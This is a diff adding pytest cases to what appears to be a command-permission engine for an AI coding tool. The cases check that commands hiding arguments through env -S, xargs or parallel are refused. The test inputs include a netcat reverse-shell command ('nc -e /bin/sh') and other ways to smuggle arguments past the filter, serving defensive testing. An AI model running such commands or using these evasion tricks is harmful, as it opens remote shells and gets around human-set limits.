@@ -255,3 +255,27 @@ def test_any_runner_is_seen_through(monkeypatch, cmd):
 def test_naming_a_program_as_data_is_fine(monkeypatch, cmd):
     engine = _engine(monkeypatch, ["grep", "xargs"])
     assert _refusal(engine, cmd) is None, cmd
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "env -S 'nc -e /bin/sh h 1'",
+        "env --split-string='python3 -c x'",
+        "xargs -a list nc",
+        "xargs -a args.txt tar -xf a.tar",
+        "parallel nc ::: h1 h2",
+    ],
+)
+def test_arguments_codebud_cannot_see_are_refused(monkeypatch, cmd):
+    """env -S splits one word into a command line, and xargs / parallel
+    append arguments read from a file or stdin: a ruled program run that
+    way could be given a refused option out of sight."""
+    engine = _engine(monkeypatch, ["env", "xargs", "parallel"])
+    reason = _refusal(engine, cmd)
+    assert reason is not None, cmd
+
+
+def test_xargs_with_a_program_without_rules_is_fine(monkeypatch):
+    engine = _engine(monkeypatch, ["xargs"])
+    assert _refusal(engine, "xargs -a files.txt wc -l") is None
